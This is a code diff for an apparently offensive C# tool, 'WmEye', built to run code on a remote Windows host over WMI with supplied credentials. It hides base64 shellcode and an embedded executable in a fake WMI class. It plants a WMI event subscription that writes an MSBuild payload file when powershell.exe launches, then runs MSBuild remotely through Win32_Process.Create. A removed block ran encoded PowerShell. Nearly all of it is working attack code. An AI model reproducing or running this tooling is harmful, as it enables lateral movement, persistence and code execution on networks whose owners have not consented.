@@ -22,35 +22,47 @@ using System.Runtime.InteropServices;
 using System.Threading;
 
 
+
 namespace WmEye
 {
     public class WmEye
     {
 
-        public static void Main()
+        public static void Main(string[] args)
         {
 
             // Handle CLI Args 
 
-            UploadShellcode();
-            ConsumerSeUpload();
-         //   UploadBuildFile();
-          //  ExecuteStageOne();
-            ExecuteStageTwo();
-          
+            string hostname = args[0];
+            string username = args[1];
+            string password = args[2];
+
+            Console.WriteLine("Username {0}", hostname);
+            Console.WriteLine("Username {0}", username);
+            Console.WriteLine("Username {0}", password);
+           
+
+            // unlock this to work!
+            
+            UploadShellcode(hostname,  username, password);
+            ConsumerSeUpload(hostname, username, password);
+            ExecuteStageTwo(hostname, username, password);
+            
+ 
             // Scope Cleanup Method
 
         }
 
+        // Fake WMI Classe and Property to Store Shellcode 
 
         private static string ShellCodeUploadTempWMIClassName = "Win32_OSRecoveryConfigurationData";
         private static string ShellCodeUploadTempWMIPropertyName = "Description";
 
-        private static string FileUploadTempWMIClassName = "Win32_OSRecoveryConfigurationFiles";
-        private static string FileUploadTempWMIPropertyName = "Description";
+        private static string writePath = "C:\\mttagic.xml";
+        private static string msbuildpath = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe ";
 
-        private static string writePath = "Z:\\BuildConfig.xml";
 
+        // Function to initiate different scopes based on namespaces and return
         private static string InitiateConnection(ref ManagementScope scope, string host, string user, string password, string wmiNamespace)
         {
             ConnectionOptions options = new ConnectionOptions
@@ -101,28 +113,42 @@ namespace WmEye
 
 
 
-        public static void Consumertwo(string data)
+        public static void Consumertwo(string data, string hostname, string username, string password)
         {
 
             Console.WriteLine(data);
+
+
 
             ManagementObject myEventFilter = null;
             ManagementObject myEventConsumer = null;
             ManagementObject myBinder = null;
 
+
             try
             {
 
-                // want a filter which executes immediately 
-                // Check for instance of a created evil class ?
+                // want a replace filter which executes immediately
 
-                ManagementScope scope = new ManagementScope(@"\\.\root\subscription");
 
+                ConnectionOptions options = new ConnectionOptions();
+
+
+
+                options.Username = username;
+                options.Password = password;
+
+
+                Console.Write("Reached");
+                string wmiNameSpace = "root\\subscription";
+                string fullscope =  String.Format(@"\\{0}\{1}", hostname, wmiNameSpace);
+                ManagementScope scope = new ManagementScope(fullscope, options);
+                scope.Connect();
                 ManagementClass wmiEventFilter = new ManagementClass(scope, new
                 ManagementPath("__EventFilter"), null);
                 String strQuery = @"SELECT * FROM __InstanceCreationEvent WITHIN 5 " +
-        "WHERE TargetInstance ISA \"Win32_Process\" " +
-        "AND TargetInstance.Name = \"notepad.exe\"";
+                  "WHERE TargetInstance ISA \"Win32_Process\" " +
+                    "AND TargetInstance.Name = \"powershell.exe\"";
 
                 WqlEventQuery myEventQuery = new WqlEventQuery(strQuery);
                 myEventFilter = wmiEventFilter.CreateInstance();
@@ -137,7 +163,7 @@ namespace WmEye
                 new ManagementClass(scope, new ManagementPath("LogFileEventConsumer"),
                 null).CreateInstance();
                 myEventConsumer["Name"] = "LogFile";
-                myEventConsumer["Filename"] = "Z:\\wmi\\magic.xml";
+                myEventConsumer["Filename"] = writePath;
                 myEventConsumer["Text"] = data;
                 myEventConsumer.Put();
 
@@ -161,22 +187,26 @@ namespace WmEye
 
 
 
-        public static void ConsumerSeUpload()
+        public static void ConsumerSeUpload(string hostname, string username, string password)
         {
 
-           string uploadFile = "Z:\\build.xml";
+           string uploadFile = "C:\\magic.xml";
             
             if (!File.Exists(uploadFile))
             {
                 Console.WriteLine("[-] Specified local file does not exist, not running PS runspace\n");
+
             }
+
           string content = File.ReadAllText(uploadFile);
+
 
           //  string originalWMIProperty = Convert.ToBase64String(uploadFileBytes);
 
             Console.WriteLine(content);
 
-            Consumertwo(content);
+
+            Consumertwo(content, hostname, username, password);
 
             CleanFilter();
 
@@ -193,7 +223,7 @@ namespace WmEye
         
         }
 
-        public static void UploadShellcode()
+        public static void UploadShellcode(string host, string username, string password)
         {
 
 
@@ -202,11 +232,16 @@ namespace WmEye
 
             // MessageBox ShellCode
 
-            string fileData = @"MdKyMGSLEotSDItSHItCCItyIIsSgH4MM3XyiccDeDyLV3gBwot6IAHHMe2LNK8BxkWBPkZhdGF18oF+CEV4aXR16Yt6JAHHZossb4t6HAHHi3yv/AHHaHl0ZQFoa2VuQmggQnJvieH+SQsxwFFQ/9c=";
+            string fileDatas = @"MdKyMGSLEotSDItSHItCCItyIIsSgH4MM3XyiccDeDyLV3gBwot6IAHHMe2LNK8BxkWBPkZhdGF18oF+CEV4aXR16Yt6JAHHZossb4t6HAHHi3yv/AHHaHl0ZQFoa2VuQmggQnJvieH+SQsxwFFQ/9c=";
 
 
+            string fileDatai = @"UFFSU1ZXVVRYZoPk8FBqYFpoY2FsY1RZSCnUZUiLMkiLdhhIi3YQSK1IizBIi34wA1c8i1wXKIt0HyBIAf6LVB8kD7csF41SAq2BPAdXaW5Fde+LdB8cSAH+izSuSAH3mf/XSIPEaFxdX15bWllYww==";
             var scope = new ManagementScope();
-            string r = InitiateConnection(ref scope, "", "", "", "");
+            string fileData = @"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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAGRAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==";
+
+            
+
+            string r = InitiateConnection(ref scope, host,username,password,"");
 
             // We're creating a static WMI class here
             ManagementObject evilClass = new ManagementClass(scope, null, null);
@@ -232,101 +267,21 @@ namespace WmEye
 
 
 
-        /* public static void UploadBuildFile()
-        {
+     
 
-            // Write MSBuild XML File to Target
-
-            string uploadFile = "Z:\\test.xml";
-         
-           
-
-            if (!File.Exists(uploadFile))
-            {
-                Console.WriteLine("[-] Specified local file does not exist, not running PS runspace\n");
-
-            }
-
-
-            // Console.WriteLine(originalWMIProperty);
-
-
-            string className = FileUploadTempWMIClassName;
-            string evilPropertyName = FileUploadTempWMIPropertyName;
-
-
-            var scope = new ManagementScope();
-            string r = InitiateConnection(ref scope, "", "", "", "");
-
-            // We're creating a static WMI class here
-            ManagementObject evilClass = new ManagementClass(scope, null, null);
-            evilClass["__CLASS"] = className;
-            evilClass.Properties.Add(evilPropertyName, CimType.String, false);
-
-
-            // Add compression later
-            byte[] uploadFileBytes = File.ReadAllBytes(uploadFile);
-
-
-            string originalWMIProperty = Convert.ToBase64String(uploadFileBytes);
-
-            evilClass.Properties[evilPropertyName].Value = originalWMIProperty.ToString();
-
-            evilClass.Put();
-
-            Console.WriteLine("[X] Build XML File Written to Property");
-
-            // Wait to finish file upload
-           Thread.Sleep(1000);
-
-
-        } 
-
-
-        public static void ExecuteStageOne()
-        {
-
-
-            string command = "$e=([WmiClass]'root\\cimv2:Win32_OSRecoveryConfigurationFiles').Properties['Description'].Value; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($e)) | Out-File -FilePath " + writePath;
-
-            var scope = new ManagementScope();
-            string r = InitiateConnection(ref scope, "", "", "", "");
-
-            var encodedCommandB64 =
-                   Convert.ToBase64String(Encoding.Unicode.GetBytes(command));
-
-
-            // Create Method from win32_process for powershell command
-
-            ObjectGetOptions optionons2 = new ObjectGetOptions();
-            ManagementPath pather = new ManagementPath("Win32_Process");
-            ManagementClass classInstance = new ManagementClass(scope, pather, optionons2);
-            ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");
-
-            inParams["CommandLine"] = "powershell -enc " + encodedCommandB64;
-
-            ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);
-
-            Console.WriteLine("[X] Config File Written");
-
-
-        } // closing Stageone
-
-        */
-
-        public static void ExecuteStageTwo()
+        public static void ExecuteStageTwo(string host, string username, string password)
         {
 
 
             var scope = new ManagementScope();
-            string r = InitiateConnection(ref scope, "", "", "", "");
+           string r = InitiateConnection(ref scope, host, username, password, "");
 
             ObjectGetOptions optionons3 = new ObjectGetOptions();
             ManagementPath pather2 = new ManagementPath("Win32_Process");
             ManagementClass classInstance2 = new ManagementClass(scope, pather2, optionons3);
             ManagementBaseObject inParams2 = classInstance2.GetMethodParameters("Create");
 
-            string Command = "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Current\\Bin\\Msbuild.exe " + writePath;
+            string Command = msbuildpath + writePath;
 
             inParams2["CommandLine"] = Command;
             Console.WriteLine("[X] Invoking : {0}", Command);
@@ -334,11 +289,12 @@ namespace WmEye
             ManagementBaseObject outParams2 = classInstance2.InvokeMethod("Create", inParams2, null);
 
 
-        }
+        } // Closing StageTwo
 
 
 
 
-    } 
+    } // class
 
-} 
+} //namespace 
+
